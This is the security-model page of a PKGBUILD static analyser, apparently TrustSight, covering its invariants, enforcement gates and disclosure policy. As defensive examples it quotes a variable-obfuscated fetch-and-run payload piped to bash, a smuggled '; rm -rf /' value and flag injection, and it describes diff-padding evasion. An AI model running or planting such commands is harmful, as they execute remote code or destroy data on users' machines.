---
description: The TrustSight security model, the invariants that back it, and how to report a vulnerability.
---

# Security Model

This page is the canonical statement of what TrustSight guarantees. It has four
parts:

- **[Part A](#part-a-trustsight-as-a-program-under-attack)**: TrustSight as a
  program consuming hostile input.
- **[Part B](#part-b-what-a-verdict-claims)**: what a TrustSight verdict claims
  about a package, and what it does not.
- **[Part C](#part-c-the-enforcement-map)**: every invariant above, mapped to the
  check that fails when it stops being true.
- **[Part D](#part-d-vulnerability-disclosure)**: what counts as a vulnerability
  in a static analyser, and how to report one.

Nothing here is aspirational. Every invariant in Part A and Part B has an
executable gate in `scripts/security_gates.py`, run in CI on every push. A claim
without a gate is a claim this project does not make.

---

## Part A: TrustSight as a program under attack

### The adversary

TrustSight reads PKGBUILDs from the AUR. The AUR is an unmoderated,
user-submitted package repository: anyone can publish, and a package can be
modified by whoever maintains it. So the model assumes the strongest realistic
adversary for this position:

**The attacker controls, entirely and with foreknowledge of this source code,
every byte of every artifact TrustSight reads about a package.** That includes
the PKGBUILD, the `.install` hook, every other file in the repository, the
package name, the maintainer name, the version strings, the commit metadata,
the commit timestamps, and the AUR metadata entry.

The attacker also knows which rules exist, what they match, and what they do
not. Detection is calibrated, published, and therefore evadable; see
[what TrustSight cannot see](explanation/what-trustsight-cannot-see.md). Part A
is not about whether an attack is detected. It is about what the attacker can do
to the *machine running TrustSight*, and the answer must be "nothing", detection
or no detection.

### The trust boundary

| Input | Trusted? | Why |
|-------|----------|-----|
| PKGBUILD, `.install`, repository tree, package and maintainer names, versions, commit metadata | **No** | Written by the party under review. |
| The AUR metadata dump and the git repository at `aur.archlinux.org` | **Transport only** | The host is fixed and reached over TLS. Its *contents* are attacker-authored and are treated as hostile input. |
| `config.toml`, `rules.toml`, `hosts.toml`, `patterns.toml`, `naming.toml`, `thresholds.toml`, `iocs.toml`, `overrides.toml` | **Yes** | Local files owned by the operator. Editing them is a supported way to tune the tool. |
| The bundled novelty seed | **Yes, narrowly** | Ships inside the package, so it is as trusted as the install itself. What it is permitted to change is bounded anyway; see below. |
| A seed or baseline supplied on the command line | **Operator's decision** | Passing a path is an explicit act of trust. The baseline importer verifies a signature; the seed importer records the digest of what was imported. |
| A file in the current working directory | **No** | Nothing is read from a relative path. Config and snapshots resolve under the config directory. |

### The invariants

**A1. No input becomes code.** There is no `eval`, no `exec`, no `os.system`, no
`shell=True`, and no unpickling anywhere in the source. Subprocesses are spawned
only to ask the local `pacman` about installed packages and to compare versions
with `vercmp`. Argument lists are always a list, never a string, so there is no
shell to inject into.

`vercmp` deserves saying out loud, because it is the one place in A1 where the
guarantee is a validation rather than a structural property. `pacman` calls take
`--` to end option parsing. `vercmp` has no `--`, and its two arguments are
version strings that came from the AUR, so they are attacker-influenced: a
package publishing the version `-h` would otherwise put a flag on a command line.
The guard is therefore the shape of the argument, checked before the spawn:

```python
_VERSION_ARG_RE = re.compile(r"^[A-Za-z0-9._+~:][A-Za-z0-9._+~:-]*$")
```

A pacman version is `[epoch:]pkgver[-pkgrel]`, so the permitted set is letters,
digits, and `. _ + ~ : -`, and the first character may not be `-`. Anything that
fails this never reaches a command line: it is compared in-process by
`_simple_vercmp` instead. When `pyalpm` is installed, no subprocess is spawned at
all and the comparison happens in-library.

The residual risk is that the shape check is a denylist-shaped allowlist, and
allowlists can be wrong. It is tested against both directions (real versions like
`1:1.1.1w-1` must pass, `-h`, `--help`, `; rm -rf /` and the empty string must
fail), and passing it buys an attacker one `vercmp` argument out of a character
set with no shell metacharacters in it.

**A2. `source=` URLs are never fetched.** Downloading what a PKGBUILD points at
would make every reviewer an SSRF probe, would tell the attacker exactly who is
inspecting them, and would turn a review into a denial-of-service amplifier. The
analysis package imports no transport at all, so this cannot be reintroduced by
accident.

**A3. One network host.** Every endpoint is a literal `https://aur.archlinux.org`
constant: the RPC, the metadata dump, the git clone, and cgit. TrustSight never
connects to a host named by the package under review. The
[trust model](explanation/trust-model.md) describes analysis as local and
deterministic, and that is true of the *analysis*: fetching is a separate stage,
with one destination.

**A4. Every read is bounded.** Every request has a timeout. Every response has a
byte cap. Decompression is capped before it is materialised, tar members are
walked lazily with a ceiling, the seed import refuses to expand past its limit,
and the diff is truncated at a configured size. A remote end never decides how
much of this machine's memory or time to use.

**A5. Matching is bounded, and the bound is declared.** Rule patterns are regexes
running over attacker-written text, so the input is clamped to
`rules.MAX_RULE_LINE_BYTES` (8 KiB) per line before matching. That bounds every
pattern at once, including ones added later, in a way that no per-pattern audit
can.

A clamp is also a truncation seam: a payload placed past byte 8192 of a single
line is not matched. A bound that silently drops content is exactly the class of
skip B2 exists to prevent, so it does not stay silent. A diff containing any
over-length line records the `line_truncated` coverage gap, and everything in B2
then applies: the run cannot report clean, and the gap is shown with the band.
Note that lines are joined across backslash continuations before this is
measured, so the limit applies to the logical line an attacker actually controls.

**A6. Expansion is bounded and never indirect.** The tokenizer resolves shell
variables so that a payload assembled from `C=curl; $C evil | bash` still reaches
the rules. That makes it the second parser eating hostile input, and the one with
an amplification property the regex engine does not have: `b=$a$a` doubles per
level, so a chain of them grows as `2**depth`, and a 517-byte PKGBUILD was once
enough to OOM the process. Four bounds apply: `_MAX_EXPANSION_PASSES` (16
rewrites, each resolving one innermost `${...}`), `_MAX_VALUE_LEN` (8 KiB for one
value), `_MAX_LINE_LEN` (64 KiB for one resolved line), and `_MAX_TABLE_BYTES`
(1 MiB for the variable table as a whole).

The important half is what happens at the bound. **A value that would exceed it
is left unexpanded, never truncated.** An unexpanded `$payload` is reported as an
unresolved pattern; a truncated one would look like a fully resolved string with
its tail quietly removed, which is the same failure mode as A5's seam and is
refused for the same reason.

Two forms are never resolved at all: indirect expansion `${!name}`, which would
let a value choose which variable is read, and length `${#name}`. Both return
unresolved rather than a guess.

**A7. Report rendering is data-driven.** A finding's plain-English text is a
template keyed by rule id, filled with named fields from the finding's evidence.
Field values are substituted, never re-expanded and never evaluated: a value
containing `{0.__class__}` renders as those characters. No template is ever drawn
from package-controlled text, and a template missing a field falls back to the
finding's reason instead of raising, so one malformed finding cannot abort a
batch.

Verdicts used to be capable of going through a language model. They are not any
more, and that is a security property worth naming rather than a refactor:
rendering now has no network dependency, no nondeterminism, and **no
prompt-injection surface in the output path**. R012 still detects injection aimed
at whoever reads the diff, because the target of that attack is the human
reviewer and always was. What changed is that TrustSight itself no longer has a
model for a package to talk to.

**A8. Archives are never extracted.** Snapshot tarballs are walked in memory,
member by member, and no path from an archive is ever written to disk. There is
no path-traversal surface because there is no extraction.

**A9. SQL is parameterised.** Every value reaches SQLite as a bound parameter.
The only interpolation into statement text is an identifier drawn from a literal
list in the same module, because SQLite cannot bind a table name.

**A10. Output is inert.** Package names, maintainer names, file paths, and quoted
evidence are attacker-controlled and are printed to a terminal. Before rendering,
they pass through `trustsight.safe_text.clean`, which removes ANSI and OSC escape
sequences, C0 and C1 control bytes, and DEL, and through `safe_markup` where the
value is interpolated into Rich console markup. A package cannot repaint the
screen to forge a verdict, cannot recolour a row, and cannot abort the render of
a batch with an unbalanced markup tag. Stored evidence and JSON output are left
byte-exact: sanitisation happens at the point of rendering, not in the analysis.

**A11. Freshness is never decided by an attacker's clock.** A maintainer-supplied
timestamp cannot convince TrustSight that a stale local copy is current; recency
is anchored on a local marker.

**A12. A seed cannot rewrite the database.** The novelty seed is additive: it can
never overwrite a row learned from a real analysis, it can only set the two
metadata keys it owns, and it cannot raise a locally learned maintainer count.
Its SHA-256 and origin are recorded on import. A seed can only make something
look *more* familiar, which can suppress a novelty signal but can never raise a
score, and the record says which artifact did it.

**A13. A baseline supplies state, not rules.** A corpus baseline is a larger
version of the same trust decision. It is signature-verified against a pinned
public key, its metadata snapshot rides outside the signed payload and is
re-hashed against the signed hash on import (so a validly signed artifact cannot
be re-published with someone else's AUR metadata attached), and an unsigned
import requires `--allow-unsigned` and is logged as local-only.

The bound matters more than the signature, because a signature says who built the
artifact, not that the contents are honest. A baseline writes exactly three
things: package profiles, PKGBUILD snapshots, and the metadata snapshot. It
cannot change a rule, a pattern, a severity, a weight or a threshold, and it
executes nothing. So the worst a hostile-but-validly-signed baseline can do is
**A12's attack at corpus scale**: supply a prior that makes the present look
unremarkable, suppressing novelty and longitudinal signals across many packages
at once. It can also do the reverse and manufacture false positives by planting
priors that do not match reality. What it cannot do is make a rule stop matching
what it matches. Import a baseline from someone whose corpus you would trust.

### What Part A does not cover

- **Building the package.** TrustSight never runs a PKGBUILD. Once you type
  `makepkg`, you are outside this model entirely.
- **The dependencies TrustSight itself installs.** `pygit2`, `rich`, `typer` and
  `tldextract` are third-party code running in this process. The PSL data
  `tldextract` uses is pinned and read offline, but the libraries themselves are
  a supply chain this project consumes and does not audit.
- **TrustSight's own distribution.** TrustSight ships as an AUR package, built
  from a fixed tag with a checksum in the recipe. It is subject to the same
  threat it describes. Verify the tag.

---

## Part B: What a verdict claims

A TrustSight verdict is a statement about **evidence found in a diff**, not a
statement about whether a package is safe. The distinction is the whole model,
and every clause below is a limit on the claim.

### B1. A score is a sum of matched evidence, nothing more

The score is deterministic: the same input always produces the same number and
the same breakdown. It is not a probability, not a confidence, and not a
prediction. A score of 0 means "none of the published rules matched", which is
exactly as strong as the rule set is, and no stronger.

### B2. A clean verdict is never issued for an analysis that was incomplete

Four things make a run partial, and all four are recorded as **coverage gaps** on
the result:

| Gap | Meaning |
|-----|---------|
| `diff_truncated` | The diff exceeded `[diff] max_diff_bytes`, so only its prefix was examined. |
| `line_truncated` | A logical line exceeded `rules.MAX_RULE_LINE_BYTES`, so its tail was not matched against any rule (A5). |
| `tree_not_analyzed` | The repository file manifest was unavailable, so only the PKGBUILD was examined. |
| `unresolved_source` | A `source=` entry is computed at build time, so the URL that will actually be fetched is not in the analysed text. |

A gap adds no points: it is not evidence about the package, and scoring it would
corrupt the calibration. What it does is constrain how the result may be
presented, in two ways that work together.

**First, a gap forbids a clean verdict.** A run with any gap and no HIGH or worse
finding is reported as **Inconclusive**, never as Low or Medium. This closes a
bypass that was previously documented and undefended: padding a diff past the
size cap and appending the payload used to turn a High into a Low.

**Second, a gap always travels with the band.** A HIGH, CRITICAL or FATAL finding
does keep its band, because hiding a confirmed finding behind "inconclusive"
would lose the thing that matters most. But that leaves a seam, and it is worth
being explicit about it, because the attacker's move is obvious once the first
rule is published: pad the diff past the cap, put the real payload after the cut,
and include one cheap deliberate HIGH in the visible prefix. The verdict then
reads "High", which is a confident-looking answer, and the reviewer's attention
lands on the decoy rather than on the fact that most of the change was never
read.

So no human-facing render ever shows a bare band for an incomplete run. The band
is qualified wherever it appears:

```
Score: 75/100 (High (incomplete analysis))
```

and the gap itself is listed as its own row, naming which part was not examined.
`Inconclusive` is not qualified, because it already says the same thing.

Machine output keeps the two facts separate rather than in a sentence: `risk` is
the bare band, `coverage_gaps` is the list, and `risk_label` is the qualified
string for consumers that want to display it. **A consumer gating on `risk`
alone, without reading `coverage_gaps`, reintroduces the seam.** That is stated
in [using TrustSight in CI](guides/using-in-ci.md), which treats a non-empty
`coverage_gaps` as blocking.

### B3. Inconclusive is not clean

`Inconclusive` is produced in two situations:

1. The score landed in the Medium band (21 to 50), `maturity()` is below 0.5, and
   no HIGH, CRITICAL or FATAL entry is in the breakdown. Maturity ramps linearly
   to 1.0 at `scoring._MATURITY_THRESHOLD` observations, which is **50**, so
   "below 0.5" means **fewer than 25 recorded analyses** for that package. The
   two numbers are one constant: 50 is where novelty reaches full weight, 25 is
   half of it. See
   [cold start and maturity](explanation/cold-start-and-maturity.md).
2. The analysis had a coverage gap, per B2. This applies at any maturity.

In both cases the tool is saying it could not form a picture, not that the
picture is good.

### B4. FATAL cannot be switched off

FATAL findings hard-stop the score at 100. Two things follow, and both are
enforced rather than promised:

- A FATAL finding is never suppressed by an override, whatever `overrides.toml`
  says. `add_override` refuses to create such an override, and the filter ignores
  one that is added by hand.
- A FATAL rule that this build ships cannot be removed or downgraded by editing
  `rules.toml`. If the on-disk file drops it or lowers its severity, the shipped
  definition is used for that run and a warning is logged. Nothing is written
  back: your file stays your file, you just do not get an analysis that pretends
  the rule was never there.

The protected set is derived from the shipped rules, not hardcoded in this page.
Today it is **R012** (prompt injection) and **R013** (unicode deception). R106 at
its confirmed tier also reaches FATAL, and is emitted from code rather than from
`rules.toml`.

The reason these two in particular are locked: their payload targets the
*reviewer*, not the machine. A run that skips them is not a tuned run, it is a run
whose output cannot be trusted at all.

### B5. Suppression is always visible

A suppressed finding is returned and reported, never discarded. A silent
suppression is indistinguishable from a missed detection, and the two must not
look the same.

### B6. What a verdict does not claim

- **It does not claim the package is safe.** It claims no published rule matched
  the evidence it examined.
- **It does not claim the ruleset is complete.** Fire rates and known gaps are
  published in [fire rates](explanation/fire-rates.md) and enforced by
  `scripts/calibration_gates.py`. Detection has documented ceilings.
- **It does not claim runtime behaviour was observed.** Nothing is executed.
- **It does not claim the build will fetch what the recipe says.** Where that
  cannot be determined statically, B2 applies.
- **Exit code is not a verdict.** `trustsight review` exits 0 when the analysis
  completed and 2 when it could not. A flagged package is reported in the output,
  not in the exit status. Gate CI on the JSON, as
  [using TrustSight in CI](guides/using-in-ci.md) shows.

---

## Part C: The enforcement map

Each row is one invariant, the gate that proves it, and where the behaviour
lives. Run them with:

```bash
python scripts/security_gates.py
```

Exit code 1 means a claim on this page has stopped being true.

| Gate | Invariant | Implementation |
|------|-----------|----------------|
| `no interpreter or shell execution` | A1 | source-wide AST scan |
| `version arguments are shape-checked` | A1 | `discovery._VERSION_ARG_RE` |
| `network confined to the fetch modules` | A2, A3 | `discovery.py`, `fetcher.py`, `full_aur/fetch.py`, `full_aur/metadata.py` |
| `declared source URLs are never fetched` | A2 | `src/trustsight/analysis/` imports no transport |
| `one network host, declared` | A3 | endpoint constants |
| `every request has a timeout` | A4 | `urlopen` call sites |
| `rule matching is bounded on hostile input` | A5 | `rules.MAX_RULE_LINE_BYTES` |
| `expansion is bounded and never indirect` | A6 | `tokenizer.py` |
| `report rendering is data-driven` | A7 | `verdict.py`, `findings.py` |
| `archives are never extracted to disk` | A8 | `full_aur/fetch.py` |
| `SQL is parameterised` | A9 | `db.py` |
| `terminal output is inert` | A10 | `safe_text.py`, `cli/` |
| `a seed cannot rewrite the database` | A12 | `db.import_seed` |
| `a baseline supplies state, not rules` | A13 | `full_aur/export.import_baseline` |
| `incomplete coverage fails closed` | B2 | `coverage.fail_closed` |
| `a truncated diff cannot read as clean` | B2 | `analysis/pipeline.py`, `full_aur/analyze.py` |
| `a coverage gap is always shown with the band` | B2 | `coverage.qualified_band`, `scoring.verdict_label` |
| `FATAL rules cannot be switched off` | B4 | `config.enforce_fatal_rules` |
| `FATAL findings survive every override` | B4, B5 | `override.filter_triggered_rules` |
| `docs/security.md matches the gates` | this page | the table above |

A11 has no row: freshness anchoring is enforced by `tests/test_fetcher.py`
rather than by a gate, because the property is about which value a function
reads and is checked most directly by calling it.

The last row is the one that keeps the rest honest: a gate with no entry here is
an unstated guarantee, and an entry with no gate is an unbacked promise. Both
fail the build.

Detection calibration is enforced separately, by `scripts/calibration_gates.py`.
See [fire rates](explanation/fire-rates.md).

---

## Part D: Vulnerability disclosure

### Reporting

**Contact:** emiliano.gandini@protonmail.com
**PGP key fingerprint:** `F759D6D49B0A395AB922414A5CC3B4C50D37E793`

Include steps to reproduce, the affected version (`trustsight --version`), and
what an attacker gains. A PKGBUILD or diff that demonstrates the issue is worth
more than a description.

1. You will receive an acknowledgement within 72 hours.
2. A triage decision, in scope or out of scope with reasons, follows within 7
   days.
3. In-scope issues are fixed on the timeline below.
4. Please do not open a public issue before a patch is available.

### Supported versions

Only the latest released version is supported. Fixes are released as a new
version; there are no backports.

### What is a vulnerability in a static analyser

This is the part most disclosure policies leave vague, and vagueness here wastes
everyone's time. TrustSight is an evidence tool with published limits, so "it
missed something" is usually a rule request, not a vulnerability.

**In scope. These are breaches of Part A**, and are treated as vulnerabilities:

- Code execution, file write, or file read outside the config, cache and data
  directories, triggered by analysing a package.
- Any outbound connection to a host other than `aur.archlinux.org`, or any fetch
  of a URL a PKGBUILD declares.
- Terminal escape sequences, control bytes, or markup reaching the terminal from
  package-controlled text, including a crash of the renderer.
- Unbounded memory or CPU consumption from a crafted package: a decompression
  bomb, a pathological regex input, a response with no cap.
- SQL injection, or any write to the database driven by package-controlled text
  outside the columns intended for it.
- A seed or baseline that changes state it is not permitted to change: a rule, a
  pattern, a severity, a weight, a threshold, a metadata key it does not own, or
  a row learned from a real analysis. **A validly signed baseline whose contents
  are simply hostile is not this.** A signature says who built the artifact, not
  that its corpus is honest, and A13 bounds what a dishonest one can do: supply a
  prior that makes the present look unremarkable, at corpus scale. Escaping that
  bound is a vulnerability; operating inside it is the documented shape of
  importing someone else's corpus.

**In scope. These are breaches of Part B**, and are treated as vulnerabilities:

- A construction that causes an analysis to **skip content without a coverage gap
  being recorded**. Every bound that drops input (the diff cap, the line clamp,
  an unavailable tree, a build-time source) has a gap; a fifth way to get content
  past the analyser silently is a vulnerability.
- A construction that produces a **clean or Low verdict** despite an incomplete
  analysis, or that gets an incomplete analysis rendered with an **unqualified
  band** to a human reader.
- Suppressing, removing or downgrading a FATAL rule or finding through any
  supported input.
- Making a finding disappear from the report without it appearing as suppressed.
- Any nondeterminism in the score: the same input producing different numbers.

**Out of scope.** These are the documented shape of the tool, not defects in it:

- **Rule evasion.** Writing a payload no rule matches. The rule set is published
  with its fire rates and its known gaps, and evasion is expected. This is a rule
  request, and a good one is very welcome as a normal issue with a fixture. It is
  not a vulnerability, and it does not get an embargo.
- **Score tuning.** Arguing a finding should weigh more or less. Weights are
  configuration; see [tuning false positives](guides/tuning-false-positives.md).
- **False positives.** Same reason.
- **A compromised upstream AUR package.** TrustSight audits them. That is the
  point.
- **Anything requiring an attacker who can already write to your config
  directory or your database.** At that point they can change the rules
  directly, and this model does not defend against a local attacker with write
  access to your own files.
- **Absence of runtime or sandbox analysis.** Not implemented, and stated as not
  implemented.
- **Anything about the package after `makepkg` runs.** Out of the model.

### Timelines

| Severity | Definition | Fix released within |
|----------|------------|---------------------|
| Critical | Code execution or file write on the reviewer's machine from analysing a package. | 7 days |
| High | Any other Part A breach, or a verdict-integrity breach under Part B. | 30 days |
| Moderate | A Part A or Part B breach that needs an unlikely precondition. | 90 days |
| Low | Hardening with no demonstrated attack. | Next release |

Reporters are credited in the changelog unless they ask not to be.
